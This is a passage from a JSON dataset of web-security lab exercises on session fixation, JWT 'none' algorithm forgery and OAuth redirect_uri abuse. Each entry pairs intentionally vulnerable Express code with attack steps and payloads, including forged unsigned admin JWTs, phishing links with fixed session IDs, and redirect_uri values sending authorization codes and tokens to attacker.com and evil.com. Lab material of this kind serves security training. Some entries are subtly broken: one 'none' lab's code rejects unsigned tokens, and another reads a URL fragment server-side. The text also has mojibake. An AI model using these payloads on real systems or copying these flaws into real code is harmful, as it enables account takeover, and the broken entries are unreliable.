    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const code = 'temp-auth-code';  res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'temp-auth-code') return res.json({ access_token: 'user-token' }); res.status(400).send('Invalid code'); }); app.get('/me', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'user-token') return res.send('Hello Carlos'); res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "https://target.com/oauth/authorize?client_id=abc&redirect_uri=http://attacker.com/callback",
      "GET http://attacker.com/callback?code=temp-auth-code",
      "POST /oauth/token with code=temp-auth-code",
      "GET /me with Authorization: Bearer user-token"
    ]
  },
  {
    "Lab scenario": "Session fixation in login workflow via URL parameter",
    "Lab Description": "The application fails to regenerate session tokens upon successful login. Instead, it allows user-supplied session IDs via the URL. An attacker can predefine a session ID, share it with a victim, and later take over the session post-login. The application reflects session identifiers in the URL without validation. To solve: hijack Carlos's session by forcing him to authenticate using an attacker-defined session ID and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a GET /login?session=XYZ123 request and observe the server accepts and sets this session token.",
      "2.Confirm the vulnerability by logging in as yourself using a predefined session ID and checking if the session persists post-login.",
      "3.Craft a phishing link like https://vulnerable.site/login?session=attackerToken and send it to Carlos.",
      "4.Once Carlos logs in using the malicious link, reuse the session ID 'attackerToken' to access his session.",
      "5.Navigate to /my-account with the fixed session ID and confirm the takeover by viewing Carlos\u00e2\u20ac\u2122s details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'keyboardcat', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { if (req.query.session) { req.session.id = req.query.session; } res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.status(403).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Account page of ' + req.session.user); else res.status(403).send('Not logged in'); }); app.listen(3000);",
    "payloads": [
      "https://vulnerable.site/login?session=attackerToken",
      "Set-Cookie: session=attackerToken",
      "GET /my-account with session=attackerToken"
    ]
  },
  {
    "Lab scenario": "JWT token tampering via algorithm confusion in Authorization header",
    "Lab Description": "The application uses JWTs for session authentication, but fails to enforce signature verification when the `alg` field is set to 'none'. It accepts unsigned tokens if the `alg` header is manipulated. The application trusts decoded claims blindly without validating token integrity. To solve: craft a JWT with 'none' algorithm and escalate privileges to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Capture a valid JWT after login using Burp Suite. Note the `alg` field in the header is `HS256`.",
      "2.Decode the JWT using jwt.io or Burp decoder. Modify the header to {\"alg\":\"none\"} and payload to {\"username\":\"carlos\"}.",
      "3.Remove the JWT signature section entirely and re-encode the header and payload using Base64.",
      "4.Use Burp Suite or Postman to resend a request with the tampered token in the Authorization: Bearer header.",
      "5.Verify that you have accessed Carlos's session by confirming the contents of /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'carlos123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token); res.send('Account details for ' + decoded.username); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect in redirect_uri parameter allows account takeover",
    "Lab Description": "The OAuth flow implemented in this application fails to validate the `redirect_uri` parameter strictly. An attacker can manipulate this parameter to point to a domain they control and steal the authorization code. The application exchanges this code for tokens without verifying the origin. To solve: intercept Carlos's authorization code and use it to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Open Burp and visit /auth?client_id=trusted-app&redirect_uri=https://malicious.site&response_type=code.",
      "2.Note that the server accepts arbitrary `redirect_uri` values as long as they are syntactically valid.",
      "3.Send a phishing link to Carlos using the above OAuth URL. Once Carlos logs in, capture the redirected request on https://malicious.site?code=XYZ123.",
      "4.Exchange the stolen code using Postman: POST /token with body { code: XYZ123, client_id: trusted-app, grant_type: authorization_code }.",
      "5.Use the received access_token to call /my-account as Carlos and verify the account access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'authCode123'; res.redirect(redirect_uri + '?code=' + code); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code, client_id } = req.body; if (code === 'authCode123' && client_id === 'trusted-app') { res.json({ access_token: 'carlosToken' }); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer carlosToken') { res.send('Sensitive data of Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5000);",
    "payloads": [
      "https://vulnerable.site/auth?client_id=trusted-app&redirect_uri=https://malicious.site&response_type=code",
      "POST /token with code=authCode123",
      "Authorization: Bearer carlosToken"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass via 'none' algorithm in API authorization",
    "Lab Description": "The application uses JSON Web Tokens (JWT) to authorize access to its internal API. However, it accepts tokens with the 'alg' field set to 'none', bypassing signature verification. The application trusts any JWT with a valid payload and does not validate its signature. To solve: Forge a JWT that impersonates the user 'carlos' and access the /api/account endpoint to retrieve their account information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a legitimate request to /api/account and capture the JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io or Burp Decoder. Observe the 'alg' header and payload structure.",
      "3. Modify the header to {\"alg\":\"none\",\"typ\":\"JWT\"} and the payload to {\"username\":\"carlos\"}. Remove the signature part completely.",
      "4. Base64-encode the modified header and payload. Rebuild the JWT as [header].[payload].",
      "5. Use Postman to send a GET request to /api/account with the forged JWT in the Authorization header. Confirm access to Carlos's account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/api/account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') { return res.send('Account details for carlos'); } } else { jwt.verify(token, 'secret', (err, user) => { if (err) return res.status(403).send('Invalid token'); if (user.username === 'carlos') return res.send('Account details for carlos'); }); } } catch (e) { res.status(400).send('Invalid token format'); } }); app.listen(3000, () => console.log('JWT None Algorithm Lab running on http://localhost:3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration",
    "Lab Description": "This lab integrates with an OAuth 2.0 provider using the implicit grant flow. However, it fails to validate the access token or issuer properly. The access_token is directly used as an authentication mechanism without validation. To solve: Obtain a forged access token for the victim 'carlos' and use it to log in via the /auth/callback endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Open Burp Suite and intercept the OAuth login process. Capture the URL redirect containing access_token in the fragment.",
      "2. Notice the token format is a simple Base64 string. Decode it to observe the structure: {\"sub\":\"username\"}.",
      "3. Modify the payload to {\"sub\":\"carlos\"} and base64-encode it. Reconstruct a fake access token.",
      "4. Paste the forged redirect URL into the browser: /auth/callback#access_token=[forged_token].",
      "5. If successful, the server accepts the token and logs you in as Carlos. Access the profile page to confirm."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const tokenFragment = req.url.split('#access_token=')[1]; if (!tokenFragment) return res.status(400).send('Missing token'); const payload = JSON.parse(Buffer.from(tokenFragment, 'base64').toString()); if (payload.sub === 'carlos') { return res.send('Logged in as Carlos'); } res.status(401).send('Access denied'); }); app.listen(5000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:5000'));",
    "payloads": [
      "eyJzdWIiOiJjYXJsb3MifQ==",
      "#access_token=eyJzdWIiOiJjYXJsb3MifQ=="
    ]
  },
  {
    "Lab scenario": "OAuth redirect_uri manipulation leading to account takeover",
    "Lab Description": "The application uses OAuth to delegate authentication to a third-party provider but improperly validates the redirect_uri parameter. The application fails to strictly match or validate trusted domains. To solve: hijack the OAuth flow and gain access to Carlos\u00e2\u20ac\u2122s account using a crafted redirect_uri.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP or Burp Suite to intercept the OAuth authorization request.",
      "2.Observe the redirect_uri parameter in the request to the authorization endpoint. Modify it to a controlled open redirect domain (e.g., https://attacker.com/redirect?target=https://lab-id.web-security-academy.net/oauth-callback).",
      "3.Register a phishing endpoint on attacker.com that captures the OAuth code query parameter.",
      "4.Visit the authorization URL in your browser to trigger the flow and intercept the OAuth code on attacker.com.",
      "5.Replay the code to the vulnerable /oauth-callback endpoint with the victim's session context.",
      "6.Access Carlos's My Account page to confirm the takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const session = {}; app.get('/login', (req, res) => { const oauthUrl = `https://oauth-provider.com/auth?client_id=abc123&redirect_uri=${req.query.redirect_uri}&response_type=code`; res.redirect(oauthUrl); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; try { const tokenResponse = await axios.post('https://oauth-provider.com/token', { code }); const userInfo = await axios.get('https://oauth-provider.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); session[userInfo.data.username] = true; res.redirect('/my-account'); } catch (err) { res.status(500).send('OAuth Error'); } }); app.get('/my-account', (req, res) => { res.send('Sensitive account data for logged-in user'); }); app.listen(3000);",
    "payloads": [
      "https://attacker.com/redirect?target=https://victim-lab.com/oauth-callback",
      "https://attacker.com/capture?next=https://victim-lab.com/oauth-callback"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability",
    "Lab Description": "The application uses JWTs for session handling and accepts unsigned tokens due to improper algorithm enforcement. The backend uses a vulnerable JWT library that accepts 'alg':'none'. To solve: forge an unsigned JWT to impersonate Carlos and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Postman or jwt.io debugger to inspect a valid JWT obtained after login.",
      "2.Note the header includes 'alg':'HS256'. Modify it to 'alg':'none' and remove the signature.",
      "3.Modify the payload section of the JWT to set the username to carlos.",
      "4.Base64-encode the modified header and payload, omitting the signature.",
      "5.Replace the JWT in your session cookie with the tampered token using Burp Suite.",
      "6.Visit /my-account and confirm access as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.cookie('token', token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { try { const decoded = jwt.verify(req.cookies.token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${decoded.username}`); } catch { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation using insecure token handling",
    "Lab Description": "The application allows setting the session ID via URL query parameter. The server does not invalidate or regenerate the session after login. To solve: fix a session ID before login and trick Carlos into using it, then hijack his session post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Generate a known session ID (e.g., abc123) and visit the app using ?session=abc123 in the URL.",
      "2.Capture and store the Set-Cookie header from the response using Burp Suite.",
      "3.Trick Carlos into visiting the link with the same session ID (e.g., using social engineering or phishing email).",
      "4.After Carlos logs in, revisit the site with the same session ID to hijack his authenticated session.",
      "5.Navigate to /my-account to confirm access as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.use((req, res, next) => { let sid = req.query.session || req.cookies.session; if (!sid) sid = Math.random().toString(36).substr(2); sessions[sid] = sessions[sid] || {}; res.cookie('session', sid); req.session = sessions[sid]; next(); }); app.get('/login', (req, res) => { const { username } = req.query; req.session.user = username; res.send('Logged in'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Sensitive account data for Carlos'); else res.send('Not authorized'); }); app.listen(3000);",
    "payloads": [
      "http://victim-lab.com/?session=abc123",
      "http://victim-lab.com/login?username=carlos&session=abc123"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm manipulation in API auth header",
    "Lab Description": "The application uses a JWT token for authentication, accepting the token from an Authorization: Bearer header. The backend insecurely supports the 'none' algorithm in JWT validation, allowing the signature to be bypassed. To solve: forge a token that grants admin access without knowing the original signing key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept login request with Burp Suite and capture JWT token in Authorization header",
      "Copy the JWT to jwt.io and observe it uses HS256 algorithm with predictable payload structure",
      "Modify alg to 'none', remove signature, and set payload to {\"username\": \"admin\", \"role\": \"admin\"}",
      "Use Postman to send a GET request to /admin-dashboard with modified JWT in Authorization header",
      "Confirm access to admin dashboard and note server response with admin session token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username, role: 'user' }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome, admin!'); } else { const verified = jwt.verify(token, 'secret'); if (verified.role === 'admin') return res.send('Welcome, admin!'); } res.status(403).send('Forbidden'); } catch { res.status(403).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth implicit grant token leakage via Referer",
    "Lab Description": "The application implements an OAuth 2.0 implicit grant flow that directly exposes access tokens in the URL fragment. When third-party JavaScript is loaded on redirect URIs, these tokens are leaked via Referer headers. To solve: extract an access token belonging to Carlos using Referer header leakage and reuse it to access protected resources.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept OAuth redirection to /oauth-callback with access_token in URL fragment",
      "Note that third-party script from evil.net is embedded in /oauth-callback",
      "Observe that the Referer header in the request to evil.net leaks access_token",
      "Visit the OAuth flow link again in browser with Intercept off to trigger Referer leak",
      "Send the leaked access token in Authorization header via Postman to GET /my-account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/oauth-callback', (req, res) => { const html = `<html><head><script src=\"https://evil.net/track.js\"></script></head><body>OAuth Complete</body></html>`; res.send(html); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer abc123token') res.send('Carlos account page'); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET https://evil.net/track.js Referer: https://target.com/oauth-callback#access_token=abc123token",
      "Authorization: Bearer abc123token"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens in login response",
    "Lab Description": "The application sets a session cookie in a GET /set-session endpoint before login. The token is reused after successful login without regeneration. An attacker can fix a session ID and force the victim to authenticate within it. To solve: fix a session ID and log in as Carlos within that session to hijack the login state.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to send GET /set-session and observe that a predictable session cookie is returned",
      "Send the fixed session cookie link to the victim using social engineering",
      "Once victim logs in, the attacker reuses the same cookie to access /my-account",
      "Send GET request to /my-account using the fixed cookie to hijack the session",
      "Confirm access to Carlos\u00e2\u20ac\u2122s account via session reuse"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/set-session', (req, res) => { const sessionId = 'fixed-session-id'; res.cookie('session', sessionId); sessions[sessionId] = { username: null }; res.send('Session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sessionId]) { sessions[sessionId].username = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.username === 'carlos') res.send('Carlos account'); else res.status(401).send('Access denied'); }); app.listen(5000);",
    "payloads": [
      "GET /set-session => Cookie: session=fixed-session-id",
      "POST /login => Cookie: session=fixed-session-id, Body: username=carlos&password=pass123",
      "GET /my-account => Cookie: session=fixed-session-id"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The login mechanism fails to assign a new session token after authentication. The application reuses the session token set prior to login. To solve: fixate a session for the victim user, log them in using social engineering or automation, then access their account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Intercept the GET /login request using Burp Suite to retrieve a valid session cookie before authentication.",
      "2. Send the session cookie to the victim using a phishing link that embeds the session value in a URL (e.g., http://vulnerable-app.com/login?session=abcd1234).",
      "3. Wait for the victim to log in, which causes the reused session to become authenticated.",
      "4. Reuse the same session cookie in your browser and navigate to /my-account.",
      "5. Confirm successful session hijacking and data access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'insecuresecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send('Welcome, ' + req.session.username); else res.status(401).send('Please log in.'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
    "payloads": [
      "http://vulnerable-app.com/login?session=abcd1234",
      "Set-Cookie: connect.sid=abcd1234; Path=/; HttpOnly",
      "Reuse stolen cookie: abcd1234 in victim\u00e2\u20ac\u2122s browser"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion vulnerability in token validation",
    "Lab Description": "The server accepts and trusts JWTs with the `alg` header set to `none`, allowing unsigned tokens to be accepted. The application trusts the payload without validating its integrity. To solve: craft a forged JWT token impersonating Carlos and use it to access /my-account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a legitimate JWT token from an authenticated request using OWASP ZAP or Burp Suite.",
      "2. Decode the JWT token using jwt.io or a script and analyze the payload and header.",
      "3. Modify the `alg` field to `none`, set `username` to `carlos`, and remove the signature part.",
      "4. Replace the JWT token in the Authorization header with the forged one.",
      "5. Send the request to /my-account and confirm access to Carlos\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { res.send('Welcome, ' + payload.payload.username); } else { try { const verified = jwt.verify(token, 'jwt-secret'); res.send('Welcome, ' + verified.username); } catch (e) { res.sendStatus(403); } } }); app.listen(4000, () => console.log('JWT Tampering Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <forged-token>",
      "{\"alg\":\"none\"} + {\"username\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token manipulation in third-party login integration",
    "Lab Description": "The application integrates with an OAuth provider but does not properly validate the `access_token` or `id_token` audience and issuer. It only parses the token payload to extract the email. To solve: forge a valid-looking token for Carlos with a fake OAuth issuer and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to observe the OAuth login flow and inspect the structure of a valid `id_token` (JWT).",
      "2. Craft a fake token using jwt.io with `email: carlos@example.com` and a spoofed `iss` (issuer).",
      "3. Set `alg` to `HS256` and sign it with a self-chosen key, e.g., 'fake-oauth-key'.",
      "4. Intercept the OAuth callback request in Burp and replace the real token with the forged one.",
      "5. Replay the modified request to the OAuth callback endpoint and confirm login as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const { id_token } = req.body; try { const payload = jwt.decode(id_token);  const email = payload.email; if (email === 'carlos@example.com') { res.send('Welcome back, Carlos!'); } else { res.send('Logged in as ' + email); } } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(5000, () => console.log('OAuth Token Manipulation Lab running on port 5000'));",
    "payloads": [
      "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.eyJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSIsImlzcyI6Imh0dHBzOi8vZmFrZW9hdXRoLmNvbS8ifQ==.<HMAC-signature>",
      "id_token=forged.jwt.token",
      "Header: {\"alg\":\"HS256\"} + Payload: {\"email\":\"carlos@example.com\"} + Signed with key 'fake-oauth-key'"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "This lab\u00e2\u20ac\u2122s login mechanism is vulnerable to session fixation. The application does not assign a new session identifier upon successful login. As a result, an attacker can set a session ID before login and reuse it. To solve the lab, gain access to Carlos's account using a pre-established session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET request to /login and capture the Set-Cookie header with the session ID.",
      "Send a crafted phishing link with this session ID embedded in the URL as a cookie to the victim.",
      "Once the victim logs in, re-use the same session ID by setting it manually in your browser using the EditThisCookie extension or Burp.",
      "Navigate to /my-account with the fixed session cookie still valid.",
      "Verify account takeover by viewing Carlos's account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: '123456' }]; app.get('/login', (req, res) => { if (!req.cookies.sessionid) res.cookie('sessionid', Math.random().toString(36).substring(7)); res.send('<form method=\"POST\">...</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { console.log('Session ID retained:', req.cookies.sessionid); res.redirect('/my-account'); } else res.send('Invalid login'); }); app.get('/my-account', (req, res) => res.send('Carlos account page')); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on port ${PORT}`));",
    "payloads": [
      "sessionid=attackerSession123",
      "Cookie: sessionid=attackerSession123",
      "Phishing URL: http://target.com/login; cookie=sessionid=attackerSession123"
    ]
  },
  {
    "Lab scenario": "JWT tampering using 'none' algorithm",
    "Lab Description": "The application uses JWT for authentication but fails to validate the token signature algorithm correctly. If the algorithm is changed to 'none', the server accepts the token as valid without verification. To solve the lab, forge a valid JWT for Carlos and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the JWT token issued after login using Burp or Postman.",
      "Copy the token and decode it using jwt.io or a Python script.",
      "Modify the payload to change the username to 'carlos'. In the header, set the alg value to 'none'.",
      "Remove the signature section of the token entirely.",
      "Send the forged token in the Authorization header and request /my-account.",
      "Verify access by reading Carlos\u00e2\u20ac\u2122s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); res.send(`Welcome ${decoded.username}`); } catch (e) { console.error('JWT error:', e.message); res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algo Lab running on port ${PORT}`));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Final JWT: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "The OAuth implementation accepts arbitrary redirect URIs without proper whitelisting, allowing an attacker to intercept tokens. This can be abused to steal Carlos's OAuth access token. To solve the lab, leak his token and use it to access his account data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a malicious redirect URI (e.g., http://evil.com/callback).",
      "Craft a login link with the OAuth flow, replacing the redirect_uri with your attacker site.",
      "Send the malicious link to Carlos and wait for the redirection with his token.",
      "Extract the access token from your server logs or query string.",
      "Replay the token via Postman or Burp to access /my-account with Authorization: Bearer <token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const token = Math.random().toString(36).substring(2); tokens[user] = token; console.log('Generated token:', token); res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = Object.keys(tokens).find(k => tokens[k] === token); if (user) res.send(`Welcome to ${user}'s account`); else res.status(401).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on port ${PORT}`));",
    "payloads": [
      "https://target.com/auth?redirect_uri=http://evil.com/callback&user=carlos",
      "Malicious site receives: http://evil.com/callback#access_token=abcd123",
      "Authorization: Bearer abcd123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application does not invalidate or regenerate the session ID upon successful login. This enables an attacker to fix a session for a victim prior to authentication. The application reuses existing session tokens across user privilege states. To solve: Hijack Carlos's session after setting it yourself and gaining access to /my-account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a login request. Observe that session cookies (e.g., `sessionId`) remain unchanged before and after login.",
      "2. Use Burp to register/login as your own user and capture your session cookie.",
      "3. Send a crafted phishing link to Carlos that forces him to log in while using your attacker-controlled session ID (`sessionId=attacker-session`).",
      "4. After Carlos logs in, use the same `sessionId=attacker-session` to access `/my-account`.",
      "5. Confirm the session hijack by verifying access to Carlos\u00e2\u20ac\u2122s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'secure123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.redirect('/login'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "sessionId=attacker-session",
      "Set-Cookie: sessionId=attacker-session",
      "URL with attacker session: http://example.com/login?sessionId=attacker-session"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in token verification",
